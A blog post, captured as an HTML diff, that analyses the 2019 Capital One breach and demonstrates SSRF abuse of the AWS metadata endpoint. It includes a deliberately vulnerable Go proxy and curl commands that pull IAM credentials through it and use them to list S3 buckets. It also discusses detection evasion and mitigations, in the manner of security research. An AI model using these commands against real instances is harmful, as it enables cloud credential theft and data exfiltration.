@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>Metadata abuse in AWS | Gonzalo&#39;s thoughts</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="A few weeks ago there was an attack on Capital One’s AWS infrastructure that lead to the compromise of personal information on around 100M people.
+AWS is putting great effort in avoiding S3 buckets configured for public accessWhen I read the initial reports, I thought the root cause was the usual “S3 bucket with public permissions” (S3 is a distributed object storage in AWS). It’s not uncommon that companies that are not very fluent with AWS permissions, end up making public a whole S3 bucket.">
+    <meta name="generator" content="Hugo 0.80.0" />
+    
+    
+      <META NAME="ROBOTS" CONTENT="INDEX, FOLLOW">
+    
+
+    
+
+  
+  
+    <link rel="stylesheet" href="/ananke/dist/main.css_5c99d70a7725bacd4c701e995b969fea.css" >
+  
+
+
+
+
+    
+      
+
+    
+
+    
+    
+    <meta property="og:title" content="Metadata abuse in AWS" />
+<meta property="og:description" content="A few weeks ago there was an attack on Capital One’s AWS infrastructure that lead to the compromise of personal information on around 100M people.
+AWS is putting great effort in avoiding S3 buckets configured for public accessWhen I read the initial reports, I thought the root cause was the usual “S3 bucket with public permissions” (S3 is a distributed object storage in AWS). It’s not uncommon that companies that are not very fluent with AWS permissions, end up making public a whole S3 bucket." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://gonzalo.f-v.es/posts/2019-09-03-metadata-abuse-in-aws/" />
+<meta property="article:published_time" content="2019-09-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-09-03T00:00:00+00:00" /><meta property="og:site_name" content="Gonzalo&#39;s thoughts" />
+<meta itemprop="name" content="Metadata abuse in AWS">
+<meta itemprop="description" content="A few weeks ago there was an attack on Capital One’s AWS infrastructure that lead to the compromise of personal information on around 100M people.
+AWS is putting great effort in avoiding S3 buckets configured for public accessWhen I read the initial reports, I thought the root cause was the usual “S3 bucket with public permissions” (S3 is a distributed object storage in AWS). It’s not uncommon that companies that are not very fluent with AWS permissions, end up making public a whole S3 bucket.">
+<meta itemprop="datePublished" content="2019-09-03T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2019-09-03T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1884">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Metadata abuse in AWS"/>
+<meta name="twitter:description" content="A few weeks ago there was an attack on Capital One’s AWS infrastructure that lead to the compromise of personal information on around 100M people.
+AWS is putting great effort in avoiding S3 buckets configured for public accessWhen I read the initial reports, I thought the root cause was the usual “S3 bucket with public permissions” (S3 is a distributed object storage in AWS). It’s not uncommon that companies that are not very fluent with AWS permissions, end up making public a whole S3 bucket."/>
+
+      
+    
+	<link rel="stylesheet" href="/css/main.css" />
+
+  </head>
+
+  <body class="ma0 avenir bg-near-white">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        Gonzalo&#39;s thoughts
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+      
+
+
+
+
+<a href="https://twitter.com/gonfva" target="_blank" class="link-transition twitter link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel="noopener" aria-label="follow on Twitter——Opens in a new window">
+  <svg height="32px"  style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/></svg>
+
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000" width="8px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+</span></a>
+
+
+
+
+<a href="https://www.linkedin.com/in/gonzalofernandezvictorio/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window">
+  <svg  height="32px"  style="enable-background:new 0 0 65 65;" version="1.1" viewBox="0 0 65 65" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <path d="M50.837,48.137V36.425c0-6.275-3.35-9.195-7.816-9.195  c-3.604,0-5.219,1.983-6.119,3.374V27.71h-6.79c0.09,1.917,0,20.427,0,20.427h6.79V36.729c0-0.609,0.044-1.219,0.224-1.655  c0.49-1.22,1.607-2.483,3.482-2.483c2.458,0,3.44,1.873,3.44,4.618v10.929H50.837z M22.959,24.922c2.367,0,3.842-1.57,3.842-3.531  c-0.044-2.003-1.475-3.528-3.797-3.528s-3.841,1.524-3.841,3.528c0,1.961,1.474,3.531,3.753,3.531H22.959z M34,64  C17.432,64,4,50.568,4,34C4,17.431,17.432,4,34,4s30,13.431,30,30C64,50.568,50.568,64,34,64z M26.354,48.137V27.71h-6.789v20.427  H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000" width="8px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+</span></a>
+
+
+
+
+
+
+
+
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked">
+          
+        POSTS
+      </aside>
+      
+
+
+
+
+  <div id="sharing" class="mt3">
+
+    
+    <a href="https://www.facebook.com/sharer.php?u=http://gonzalo.f-v.es/posts/2019-09-03-metadata-abuse-in-aws/" class="facebook no-underline" aria-label="share on Facebook">
+      <svg height="32px"  style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765,50.32h6.744V33.998h4.499l0.596-5.624h-5.095  l0.007-2.816c0-1.466,0.14-2.253,2.244-2.253h2.812V17.68h-4.5c-5.405,0-7.307,2.729-7.307,7.317v3.377h-3.369v5.625h3.369V50.32z   M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+
+    </a>
+
+    
+    
+    <a href="https://twitter.com/share?url=http://gonzalo.f-v.es/posts/2019-09-03-metadata-abuse-in-aws/&amp;text=Metadata%20abuse%20in%20AWS" class="twitter no-underline" aria-label="share on Twitter">
+      <svg height="32px"  style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/></svg>
+
+    </a>
+
+    
+    <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://gonzalo.f-v.es/posts/2019-09-03-metadata-abuse-in-aws/&amp;title=Metadata%20abuse%20in%20AWS" class="linkedin no-underline" aria-label="share on LinkedIn">
+      <svg  height="32px"  style="enable-background:new 0 0 65 65;" version="1.1" viewBox="0 0 65 65" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <path d="M50.837,48.137V36.425c0-6.275-3.35-9.195-7.816-9.195  c-3.604,0-5.219,1.983-6.119,3.374V27.71h-6.79c0.09,1.917,0,20.427,0,20.427h6.79V36.729c0-0.609,0.044-1.219,0.224-1.655  c0.49-1.22,1.607-2.483,3.482-2.483c2.458,0,3.44,1.873,3.44,4.618v10.929H50.837z M22.959,24.922c2.367,0,3.842-1.57,3.842-3.531  c-0.044-2.003-1.475-3.528-3.797-3.528s-3.841,1.524-3.841,3.528c0,1.961,1.474,3.531,3.753,3.531H22.959z M34,64  C17.432,64,4,50.568,4,34C4,17.431,17.432,4,34,4s30,13.431,30,30C64,50.568,50.568,64,34,64z M26.354,48.137V27.71h-6.789v20.427  H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+
+    </a>
+  </div>
+
+
+      <h1 class="f1 athelas mt3 mb1">Metadata abuse in AWS</h1>
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2019-09-03T00:00:00Z">September 3, 2019</time>
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img mid-gray pr4-l w-two-thirds-l"><p>A few weeks ago there was an attack on Capital One’s AWS infrastructure that lead to the <a href="https://www.capitalone.com/facts2019/">compromise of personal information</a> on around 100M people.</p>
+<p><img src="/img/1*TbzHUQSGDSFAZe-olzUgBQ.png" alt="email from AWS warning against S3 buckets with public access">AWS is putting great effort in avoiding S3 buckets configured for public accessWhen I read the initial reports, I thought the root cause was the usual “<a href="https://medium.com/@bhaveshthakur2015/how-i-was-able-to-exploit-misconfigured-aws-s3-bucket-on-a-production-server-of-oneplus-a9470ee02c68">S3 bucket with public permissions</a>” (S3 is a distributed object storage in AWS). It’s not uncommon that companies that are not very fluent with AWS permissions, end up making public a whole S3 bucket.</p>
+<p>It turns out that the attack was more sophisticated (<a href="https://www.linkedin.com/posts/gonzalofernandezvictorio_you-may-have-heard-about-the-capital-one-activity-6562006675115556864-45dJ">but not as much as I’d thought</a>).</p>
+<p>It used a technique called Server Side Request Forgery (make requests from a compromised server) and AWS credentials compromise (use AWS credentials from the compromised server).</p>
+<p>However, once you start thinking about it, this attack is eye-opening.</p>
+<h3 id="credentials-compromise">Credentials compromise</h3>
+<p>The details published on the <a href="https://www.justice.gov/usao-wdwa/press-release/file/1188626/download">indictment</a> of the accused individual are a bit generic, but <a href="https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/">some researchers have been digging around</a> and we have a better picture of what happened.</p>
+<p>It seems that the attacker managed to trick an incorrectly configured module in a <a href="https://en.wikipedia.org/wiki/ModSecurity">firewall</a> to make the firewall access what is known as “the metadata endpoint”. From the metadata endpoint, the attacker got the credentials associated with the EC2 instance (the virtual server that was running the firewall).</p>
+<p>It seems those credentials allowed to access a few S3 buckets. Using those credentials, the attacker connected to AWS S3 API endpoints directly and downloaded the information from those buckets without any further use of the firewall instance.</p>
+<h4 id="metadata-endpoints">Metadata endpoints</h4>
+<p>There are obvious issues in how Capital One configured its infrastructure.</p>
+<ul>
+<li>First, there is an issue in the configuration of the firewall module that allowed the compromise of that server.</li>
+<li>Second, the permissions given to an instance running a firewall were too wide. It doesn’t help that it’s not simple to correctly assign permissions in AWS. But it contradicts what’s called “least privilege principle”.
+Those issues <strong>are not trivial</strong> to deal with, but they are not uncommon to the on-premises world.</li>
+</ul>
+<p>However, in this attack there is something that is very cloud specific and it is the access to the <strong>metadata endpoint</strong> to get the credentials.</p>
+<p>The <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">metadata endpoint</a> is sort of a web server accessible only to the instance. Effectively appears as an IP address (http://169.254.169.254 in a <a href="https://tools.ietf.org/html/rfc3927">link-local</a> range) it can be accessed from its own instance running on AWS (similarly to other cloud providers), and it contains some values that are exclusive to that instance.</p>
+<p>From the metadata endpoint the instance can have access to some configuration values. For example, to get the IP address of the instance,</p>
+<p>aws $ curl http://169.254.169.254/latest/meta-data/local-ipv410.70.120.226Having the configuration as something external to the instance, allows to bootstrap the instance using a single “template” (virtual machine image) together with some configuration.</p>
+<h4 id="metadata-endpoints-and-credentials">Metadata endpoints and credentials</h4>
+<p>The metadata endpoint also may contain the credentials associated with the instance.</p>
+<p>aws $ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/){
+&ldquo;Code&rdquo; : &ldquo;Success&rdquo;,
+&ldquo;LastUpdated&rdquo; : &ldquo;2019-08-15T18:20:44Z&rdquo;,
+&ldquo;Type&rdquo; : &ldquo;AWS-HMAC&rdquo;,
+&ldquo;AccessKeyId&rdquo; : &ldquo;[redacted]&rdquo;,
+&ldquo;SecretAccessKey&rdquo; : &ldquo;[redacted]&rdquo;,
+&ldquo;Token&rdquo; : &ldquo;[redacted]&rdquo;,
+&ldquo;Expiration&rdquo; : &ldquo;2019-08-16T00:21:38Z&rdquo;
+}</p>
+<blockquote>
+<p>Why have the credentials on the metadata endpoint?Imagine we want an instance to read from an S3 bucket. Reading from an S3 bucket would need some credentials to protect confidentiality. But <strong>we don’t want</strong> to store those credentials on disk in the instance. In fact we don’t even want to have static credentials. We want to be able to change the credentials frequently (what is called “credentials rotation”)</p>
+</blockquote>
+<p>To avoid that, when preparing the instance to launch, the user can create a definition of what the instance will be able to do (in AWS terminology, an IAM role). And when the instance starts, the cloud translates those permissions into a fictitious set of credentials and lets the instance access those credentials using the metadata endpoint.</p>
+<p>To access the metadata endpoint, the instance doesn’t need credentials. But in theory, the metadata endpoint can only be accessed from the actual instance. So it should be safe. 😈</p>
+<h4 id="credentials-compromise-using-ssrf">Credentials compromise using SSRF</h4>
+<p>As I just mentioned, the metadata endpoint is in a link-local address, which means it can only be accessed from the actual instance.</p>
+<p>Obviously, if you manage to get a shell in the machine, you’re effectively “the instance”.</p>
+<p>More importantly, you don’t need to have a shell. If you manage to convince the instance to make a request to the <strong>metadata endpoint</strong>, you’re effectively “the instance”. This is called <a href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">Server Side Request Forgery</a>:</p>
+<blockquote>
+<p>In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or a[sic] modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.#### An SSRF example</p>
+</blockquote>
+<p>I mentioned at the beginning about how in the Capital One attack there was a module misconfiguration. I don’t know the specific misconfiguration. The module seems to be <a href="https://en.wikipedia.org/wiki/ModSecurity">modsecurity</a>, but a quick look into the configuration didn’t show anything obvious.</p>
+<p>However, it is very easy to simulate the same issue with one server forwarding requests (note: <em>forwarding</em> is not the same as <em>redirecting</em>).</p>
+<p>It’s so easy that, once you understand the attack, you start checking all the places where you forward requests in your own software.</p>
+<p>Anyway, since I wanted to investigate the behaviour, I created a very crappy proxy in Golang. <strong>Please, don’t use it in production</strong> (or for anything important for that matter).</p>
+<p>package main
+// Crappy proxy. DON&rsquo;T USE IT IN PRODUCTION, PLEASE, PLEASE PLEASE
+import (
+&ldquo;log&rdquo;
+&ldquo;net/http&rdquo;
+&ldquo;net/http/httputil&rdquo;
+&ldquo;net/url&rdquo;
+)func indexHandler(w http.ResponseWriter, r *http.Request) {
+urlQueryParam := r.URL.Query().Get(&ldquo;url&rdquo;)
+origin, _ := url.Parse(urlQueryParam) director := func(req *http.Request) {
+req.Host = origin.Host //See <a href="https://git.io/fjNmS">https://git.io/fjNmS</a>
+req.URL = origin
+}
+proxy := &amp;httputil.ReverseProxy{Director: director}
+proxy.ServeHTTP(w, r)
+}func main() {
+http.HandleFunc(&quot;/&quot;, indexHandler)
+log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))
+}Once I developed the code, I launched an Amazon Instance (<em>t2.nano</em> will do), with the default AWS Linux Image, and associated a security group with ports 22 and 80 open (but only for my IP). I created an IAM role (assigning “s3 readonly” permissions, enough for a test) and assigned the role to the instance.</p>
+<p>Once the instance was up and running, I followed the usual steps to connect the instance…</p>
+<p>local $ eval <code>ssh-agent -s</code>
+local $ ssh-add ~/key_i_just_created_with_the_instance.pem
+local $ ssh ec2-user@<!-- raw HTML omitted -->… followed by the typical steps for installing golang …</p>
+<p>aws $ sudo yum update
+aws $ sudo yum install -y golangand then I launched the forwarding proxy:</p>
+<p>aws $ go build ./forward.go
+aws $ sudo ./forward</p>
+<blockquote>
+<p>I had a crappy proxy listening on port 80, ready to forward any request that it receives in the <em>url</em> parameter.The proxy is purposely dumb (it’s a simple example of SSRF). But being so simple, it’s obvious that it also forwards any requests to the metadata endpoint.</p>
+</blockquote>
+<p>And for all intents and purposes, the request seems to be made from the actual instance. So I can get the credentials under which the EC2 instance is running:</p>
+<p>local $ curl <!-- raw HTML omitted -->/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<!-- raw HTML omitted -->{
+&ldquo;Code&rdquo; : &ldquo;Success&rdquo;,
+&ldquo;LastUpdated&rdquo; : &ldquo;2019-08-18T19:40:03Z&rdquo;,
+&ldquo;Type&rdquo; : &ldquo;AWS-HMAC&rdquo;,
+&ldquo;AccessKeyId&rdquo; : &ldquo;<!-- raw HTML omitted -->&rdquo;,
+&ldquo;SecretAccessKey&rdquo; : &ldquo;<!-- raw HTML omitted -->&rdquo;,
+&ldquo;Token&rdquo; : &ldquo;<!-- raw HTML omitted -->&rdquo;,
+&ldquo;Expiration&rdquo; : &ldquo;2019-08-19T02:10:29Z&rdquo;
+}I don’t know what was the specific compromise in Capital One’s case.</p>
+<p>But <strong>SSRF can be really nasty in a cloud environment</strong>.</p>
+<h3 id="using-compromised-credentials">Using compromised credentials</h3>
+<p>Obviously, once you have those credentials, you can use them from anywhere in the world.</p>
+<p>In the following listing, from a local machine exploiting SSRF, first we get the credentials and then those credentials are used to get the number of S3 buckets.</p>
+<p>local $ curl -s <!-- raw HTML omitted -->/?url=<a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/gonzalo-metadata">http://169.254.169.254/latest/meta-data/iam/security-credentials/gonzalo-metadata</a> &gt; /tmp/aws_cred.json
+local $ export AWS_ACCESS_KEY_ID=$(jq -r &lsquo;.AccessKeyId&rsquo; /tmp/aws_cred.json)
+local $ export AWS_SECRET_ACCESS_KEY=$(jq -r &lsquo;.SecretAccessKey&rsquo; /tmp/aws_cred.json)
+local $ export AWS_SESSION_TOKEN=$(jq -r &lsquo;.Token&rsquo; /tmp/aws_cred.json)
+local $ aws s3 ls|wc -l
+8Let’s reiterate this again.</p>
+<blockquote>
+<p>Once you’ve got the credentials, you can use them to access any AWS services that the instance is allowed to access.#### Mitigations</p>
+</blockquote>
+<p>Last year people in Netflix where already aware of this problem and wrote a couple of super interesting articles on <a href="https://medium.com/netflix-techblog/netflix-cloud-security-detecting-credential-compromise-in-aws-9493d6fd373a">detection</a> and <a href="https://medium.com/netflix-techblog/netflix-information-security-preventing-credential-compromise-in-aws-41b112c15179">prevention</a> for this type of attacks.</p>
+<p>You should read both articles, because they explain the problem and solutions better than me. In any case, my layman summary would be:</p>
+<ul>
+<li>For <strong>detection</strong>, you can parse CloudTrail (AWS CloudTrail is a service that logs every call to AWS). Simplifying, you would check and record the IP from where the instance makes an API call for the first time. If later on, that instance makes another call from a different IP, it is most likely an attacker using the credentials he/she has already obtained.</li>
+<li>For <strong>prevention</strong>, instances wouldn’t have direct access to the metadata endpoint. They would have access to a proxy that would check if the call has a specific header attached. Attaching a header to the proxy would be more difficult than making a simple request.</li>
+</ul>
+<h3 id="rest-api-exploiting">REST API exploiting</h3>
+<p>Netflix’s <strong>detection</strong> technique assumes that once the credentials are compromised, the attacker no longer uses the EC2 instance to access AWS services. And with that assumption, detects the compromise in a change of IP address.</p>
+<p><img src="/img/1*VQB6XiMQRlENB2a59jeZ2g.jpeg" alt="Wolf in sheep’s clothing">Wolf in sheep’s clothing (by <a href="https://www.flickr.com/photos/drewtarvin/24107843813">Drew Travin</a>)But that is not a correct assumption. Because <a href="https://docs.aws.amazon.com/AmazonS3/latest/API/RESTServiceGET.html">some</a> of the AWS services can be accessed via GET using a REST API (and a specific <a href="https://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-authenticating-requests.html">signing process</a>). And if the attacker managed to invoke the metadata endpoint, it may be able to invoke the REST API, especially considering that REST APIs can receive all the parameters via query string.</p>
+<p>I’m not going to detail the steps (sorry, no public code), but I can confirm that the following works:</p>
+<ul>
+<li>Use SSRF to get the credentials (as we saw it before).</li>
+<li>Build the request and sign it. In <a href="https://docs.aws.amazon.com/general/latest/gr/sigv4-signed-request-examples.html#sig-v4-examples-get-query-string">this example</a> you can see how to do it, although it will need some modifications because that script doesn’t manage session tokens. The documentation is not quite correct (<em>COUGH</em>payload_hash<em>COUGH</em>).</li>
+<li>Use SSRF again to send the request using the URL for the signed request. In the below example, the invocation uses only a GET request with query string parameters (no need to send headers). The end result is a list of buckets that the instance can access. Using SSRF we have accessed AWS APIs.
+local $ eval <code>python3 creds.py</code>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->[REDACTED]<!-- raw HTML omitted --><!-- raw HTML omitted -->[REDACTED]<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->[REDACTED]<!-- raw HTML omitted --><!-- raw HTML omitted -->2019-07-09T19:01:03.000Z<!-- raw HTML omitted --><!-- raw HTML omitted -->[&hellip;]<!-- raw HTML omitted --><!-- raw HTML omitted -->I want to stress that since we’re using SSRF, the request comes from the instance.</p>
+</li>
+</ul>
+<p><img src="/img/1*U8CWJ354T_MiGu0eCZKPEg.png" alt="AWS Cloudtrail record of the API access where the source IP is the instance IP">CloudTrail entry for the “attack”. Source IP is the actual instance IPSo, limiting the source IP has no impact.</p>
+<blockquote>
+<p>Netflix proposal for a detection system may not work.### Conclusions</p>
+</blockquote>
+<p>Netflix’s technique to detect credentials abuse is not always valid. When coupling SSRF with metadata endpoint abuse, it can be avoided by using REST API exploitation.</p>
+<p>The main remaining mitigation would be to apply the least privilege principle and reduce the permissions assigned to the instances. However, as I mentioned on a previous article, <a href="https://medium.com/@gonfva/configuration-in-aws-is-difficult-6e9474ce560b">the implications of assigning a specific permission are not always fully understood</a>.</p>
+<p>SSRF can be catastrophic in a cloud environment. Misconfiguration in the permissions coupled to SSRF is <strong>game over.</strong></p>
+<p>This article expresses my research and views and it doesn’t necessarily express those of my employer(s).</p>
+<ul class="pa0">
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://gonzalo.f-v.es/" >
+    &copy;  Gonzalo Fernandez-Victorio, 2008-2021 2021 
+  </a>
+    <div>
+
+
+
+
+<a href="https://twitter.com/gonfva" target="_blank" class="link-transition twitter link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel="noopener" aria-label="follow on Twitter——Opens in a new window">
+  <svg height="32px"  style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/></svg>
+
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000" width="8px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+</span></a>
+
+
+
+
+<a href="https://www.linkedin.com/in/gonzalofernandezvictorio/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window">
+  <svg  height="32px"  style="enable-background:new 0 0 65 65;" version="1.1" viewBox="0 0 65 65" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
